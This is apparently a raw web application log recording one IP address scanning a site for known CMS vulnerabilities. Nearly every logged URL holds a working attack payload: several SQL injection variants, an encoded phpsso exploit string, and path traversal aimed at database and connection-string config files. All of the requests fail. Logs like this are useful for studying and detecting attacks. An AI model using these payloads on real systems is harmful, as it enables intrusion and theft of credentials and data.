[ 2016-01-11T08:10:27+08:00 ] 121.42.0.15 /upload/index.php?m=tag&a=view&name=1+union+select/**/+m_name,md5(233333)+from+information_schema.tables%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000340s ]
ERR: 无法加载模块:Tag

[ 2016-01-11T08:10:48+08:00 ] 121.42.0.15 /index.php?m=wap&c=index&a=comment_list&commentid=content_12%2527%20or%20updatexml(1,concat(0x7e,(version())),0)%23-84-1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000319s ]
ERR: 无法加载模块:Wap

[ 2016-01-11T08:11:37+08:00 ] 121.42.0.15 /index.php?m=tg/admin&s=delivery_address
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000316s ]
ERR: 无法加载模块:Tg/admin

[ 2016-01-11T08:11:39+08:00 ] 121.42.0.15 /index.php?m=download/admin&s=order_update
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000302s ]
ERR: 无法加载模块:Download/admin

[ 2016-01-11T08:11:42+08:00 ] 121.42.0.15 /index.php?m=buy/admin&s=add_cat
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000322s ]
ERR: 无法加载模块:Buy/admin

[ 2016-01-11T08:12:09+08:00 ] 121.42.0.15 /index.php?m=poster&c=index&a=poster_click&id=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000367s ]
ERR: 无法加载模块:Poster

[ 2016-01-11T08:13:13+08:00 ] 121.42.0.15 /index.php?m=vote&c=index&a=post&subjectid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000349s ]
ERR: 无法加载模块:Vote

[ 2016-01-11T08:17:35+08:00 ] 121.42.0.15 /index.php?m=message
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000366s ]
ERR: 无法加载模块:Message

[ 2016-01-11T08:17:53+08:00 ] 121.42.0.15 /user/reg/regajax.asp?action=getcityoption&province=%2527%2520%2575%256e%2569%256f%256e%2520%2553%2565%256c%2565%2563%2574%2520%2574%256f%2570%2520%2531%2530%2520%2541%2564%256d%2569%256e%2549%2544%252c%2549%256e%2574%2528%2536%2535%2535%2533%2536%2536%2535%2535%2533%252d%2531%2530%2532%2534%2531%2530%2532%2534%2529%2520%2546%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
ERR: 无法加载模块:User

[ 2016-01-11T08:51:06+08:00 ] 121.42.0.15 /index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000335s ]
ERR: 无法加载模块:Goods

[ 2016-01-11T08:52:12+08:00 ] 121.42.0.15 /phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000291s ]
ERR: 无法加载模块:Phpsso

[ 2016-01-11T08:52:24+08:00 ] 121.42.0.15 /User/UserZone/School/Download.aspx?f=..%5C..%5C..%5CConfig%5CConnectionStrings.config
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000299s ]
ERR: 无法加载模块:User

[ 2016-01-11T08:52:39+08:00 ] 121.42.0.15 /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000355s ]
ERR: 无法加载模块:Search

